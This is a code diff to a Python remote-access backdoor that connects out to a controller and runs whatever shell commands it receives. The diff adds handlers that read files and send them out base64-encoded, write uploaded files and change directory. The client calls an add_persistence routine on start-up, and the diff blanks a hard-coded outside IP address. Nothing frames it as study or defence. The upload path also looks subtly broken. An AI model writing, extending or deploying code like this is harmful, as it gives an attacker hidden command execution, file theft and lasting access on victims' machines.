@@ -1,3 +1,4 @@
+import base64
 import os
 import shutil
 import subprocess
@@ -22,17 +23,38 @@ class Socket:
             except ValueError:
                 continue
 
+    def get_file_contents(self, path):
+        with open(path, "rb") as f:
+            return base64.b64encode(f.read())
+
+    def save_file(self, path, content):
+        with open(path, "wb") as f:
+            f.write(base64.b64encode(content))
+            return "Successfully Uploaded"
+
+    def execute_cd(self, dir):
+        os.chdir(dir)
+        return "Directory changed as "+dir
+
     def execute(self, command):
         return subprocess.check_output(command, shell=True)
 
     def start_socket(self):
         while True:
             command = self.data_receive()
+            result = ""
             try:
                 if command[0] == "quit":
                     self.connection.close()
                     exit()
-                result = self.execute(command)
+                elif command[0] == "cd" and len(command) > 1:
+                    result = self.execute_cd(command[1])
+                elif command[0] == "download" and len(command) > 1:
+                    result = self.get_file_contents(command[1])
+                elif command[0] == "upload" and len(command) > 1:
+                    result = self.save_file(command[1], command[2])
+                else:
+                    result = self.execute(command)
             except Exception:
                 result = "Error"
             self.connection.send(simplejson.dumps(result).encode("utf-8"))
@@ -48,7 +70,7 @@ def add_persistence():
 
 
 add_persistence()
-IPAddr = "212.253.216.44"
+IPAddr = ""
 Port = 8080
 my_socket = Socket(IPAddr, Port)
 my_socket.start_socket()
